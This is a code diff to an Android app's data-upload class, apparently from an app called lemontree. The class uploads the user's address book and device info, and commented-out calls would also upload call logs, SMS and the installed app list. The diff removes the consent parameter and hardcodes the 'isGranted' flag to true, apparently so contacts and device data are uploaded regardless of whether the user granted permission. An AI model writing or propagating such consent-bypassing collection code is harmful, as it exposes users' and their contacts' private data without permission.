@@ -1,10 +1,8 @@
 package com.lemontree.android.uploadUtil;
 
-import android.os.Handler;
 import android.util.Log;
 
 import com.google.gson.Gson;
-import com.lemontree.android.service.LocationService;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -40,21 +38,10 @@ public class UploadNecessaryData {
         void error();
     }
 
-    public void upload(String userId, UploadDataListener mListener, boolean isGranted) {
-        this.isGranted = isGranted;
+    public void upload(String userId, UploadDataListener mListener) {
+        this.isGranted = true;
         uploadAddressBook(userId, mListener);
-
-        if ((int) LocationService.getInstance().getLocationX() == 0) {
-            new Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    uploadDeviceInfo(userId, mListener);
-                }
-            }, 1500);
-        } else {
-            uploadDeviceInfo(userId, mListener);
-        }
-
+        uploadDeviceInfo(userId, mListener);
 //        uploadCallRecord(userId, mListener);
 //        uploadSms(userId, mListener);
 //        uploadAppList(userId, mListener);
